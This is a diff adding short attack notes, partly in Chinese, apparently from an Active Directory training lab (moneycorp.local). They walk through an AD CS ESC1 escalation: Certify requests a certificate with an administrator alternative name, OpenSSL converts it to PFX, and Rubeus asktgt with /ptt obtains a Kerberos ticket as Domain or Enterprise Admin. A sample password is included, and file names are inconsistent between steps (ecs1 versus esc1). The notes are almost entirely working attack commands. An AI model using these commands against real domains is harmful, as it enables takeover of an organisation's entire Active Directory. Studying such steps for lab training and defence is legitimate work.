@@ -1,0 +1,21 @@
+1.请求证书，通过证书模板
+
+certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+===========
+altname For Enterprise Admins
+
+certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
+
+
+2.将cert.pem转换成 pfx格式,生成的内容 copy 保存至cert.pem
+
+openssl pkcs12 -in ecs1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ecs1.pfx
+
+3.请求TGT for DA or EA
+
+Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:xxx /ptt
+=========
+For EA
+
+Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:ecs1.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
+
